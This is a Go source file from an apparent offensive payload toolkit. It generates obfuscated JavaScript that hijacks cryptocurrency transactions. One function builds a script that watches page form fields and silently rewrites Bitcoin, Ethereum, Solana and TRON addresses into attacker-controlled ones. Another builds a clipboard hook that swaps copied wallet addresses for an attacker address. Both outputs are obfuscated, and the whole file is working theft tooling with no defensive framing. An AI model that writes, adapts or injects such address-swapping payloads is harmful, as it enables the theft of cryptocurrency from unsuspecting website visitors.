package payloads

import (
	"fmt"
	"regexp"
)

// CryptoSwapConfig holds configuration for cryptocurrency address swapping.
type CryptoSwapConfig struct {
	TargetAddresses map[string]string `json:"target_addresses,omitempty"`
	Chains          []string          `json:"chains,omitempty"`
	WatchSelectors  []string          `json:"watch_selectors,omitempty"`
	SwapMethod      string            `json:"swap_method,omitempty"`
	ReplacementAddr string            `json:"replacement_addr,omitempty"`
	AttackerBTC     string            `json:"attacker_btc,omitempty"`
	AttackerETH     string            `json:"attacker_eth,omitempty"`
}

// Common crypto address patterns by chain
var CryptoPatterns = map[string]*regexp.Regexp{
	"BTC":  regexp.MustCompile(`\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b|\bbc1[a-z0-9]{39,59}\b`),
	"ETH":  regexp.MustCompile(`\b0x[a-fA-F0-9]{40}\b`),
	"SOL":  regexp.MustCompile(`\b[1-9A-HJ-NP-Za-km-z]{32,44}\b`),
	"TRON": regexp.MustCompile(`\bT[A-Za-z1-9]{33}\b`),
	"LTC":  regexp.MustCompile(`\b[LMT][a-km-zA-HJ-NP-Z1-9]{25,34}\b|\bltc1[a-z0-9]{39,59}\b`),
}

func resolveCryptoAddresses(cfg CryptoSwapConfig) (map[string]string, string) {
	addrMap := make(map[string]string)
	for k, v := range cfg.TargetAddresses {
		addrMap[k] = v
	}
	if cfg.AttackerBTC != "" {
		addrMap["BTC"] = cfg.AttackerBTC
	}
	if cfg.AttackerETH != "" {
		addrMap["ETH"] = cfg.AttackerETH
	}
	repl := cfg.ReplacementAddr
	if repl == "" {
		if cfg.AttackerETH != "" {
			repl = cfg.AttackerETH
		} else if cfg.AttackerBTC != "" {
			repl = cfg.AttackerBTC
		} else {
			repl = "0x000000000000000000000000000000000000dEaD"
		}
	}
	if len(addrMap) == 0 {
		addrMap["*"] = repl
	}
	return addrMap, repl
}

// GenerateCryptoSwapDOM creates a DOM-based crypto address swapper.
func GenerateCryptoSwapDOM(cfg CryptoSwapConfig) (string, error) {
	addrMap, repl := resolveCryptoAddresses(cfg)
	if _, ok := addrMap["*"]; !ok {
		addrMap["*"] = repl
	}

	addrObj := "{"
	for orig, r := range addrMap {
		addrObj += fmt.Sprintf("'%s':'%s',", orig, r)
	}
	addrObj += "}"

	varName := randomString(8)
	funcName := randomString(10)

	payload := fmt.Sprintf(`(function(){
  var %s = %s;
  var patterns = {
    'BTC': /[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}/g,
    'ETH': /0x[a-fA-F0-9]{40}/g,
    'SOL': /[1-9A-HJ-NP-Za-km-z]{32,44}/g,
    'TRON': /T[A-Za-z1-9]{33}/g
  };
  
  function %s(el){
    var orig = el.value || el.textContent;
    if(!orig) return;
    for(var chain in patterns){
      var match = orig.match(patterns[chain]);
      if(match){
        for(var m of match){
          var repl = %s[chain] || %s[m] || %s['*'];
          if(repl){
            el.dataset.origAddr = m;
            if(el.value !== undefined){
              el.value = el.value.replace(m, repl);
            }
            if(el.textContent !== undefined){
              el.textContent = el.textContent.replace(m, repl);
            }
          }
        }
      }
    }
  }
  
  var obs = new MutationObserver(function(mutations){
    mutations.forEach(function(m){
      m.addedNodes.forEach(function(n){
        if(n.nodeType === 1){
          if(n.tagName === 'INPUT' || n.tagName === 'TEXTAREA' || n.isContentEditable){
            %s(n);
          }
          n.querySelectorAll('input,textarea,[contenteditable=true]').forEach(%s);
        }
      });
    });
  });
  obs.observe(document.body,{childList:true,subtree:true,attributes:true,attributeFilter:['value']});
  
  document.querySelectorAll('input,textarea,[contenteditable=true]').forEach(%s);
})();`, varName, addrObj, funcName, varName, varName, varName, funcName, funcName, funcName)

	return ObfuscateJS(payload), nil
}

// GenerateClipboardHijack creates a clipboard-based crypto address swapper.
func GenerateClipboardHijack(cfg CryptoSwapConfig) (string, error) {
	_, repl := resolveCryptoAddresses(cfg)

	funcName := randomString(10)

	payload := fmt.Sprintf(`(function(){
  var REPLACEMENT = '%s';
  var cryptoPatterns = [
    /[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}/,
    /0x[a-fA-F0-9]{40}/,
    /[1-9A-HJ-NP-Za-km-z]{32,44}/,
    /T[A-Za-z1-9]{33}/
  ];
  
  function %s(text){
    for(var p of cryptoPatterns){
      if(p.test(text)) return true;
    }
    return false;
  }
  
  document.addEventListener('copy', function(e){
    var sel = window.getSelection().toString();
    if(%s(sel)){
      e.preventDefault();
      e.clipboardData.setData('text/plain', REPLACEMENT);
    }
  });
  
  document.addEventListener('cut', function(e){
    var sel = window.getSelection().toString();
    if(%s(sel)){
      e.preventDefault();
      e.clipboardData.setData('text/plain', REPLACEMENT);
    }
  });
})();`, repl, funcName, funcName, funcName)

	return ObfuscateJS(payload), nil
}
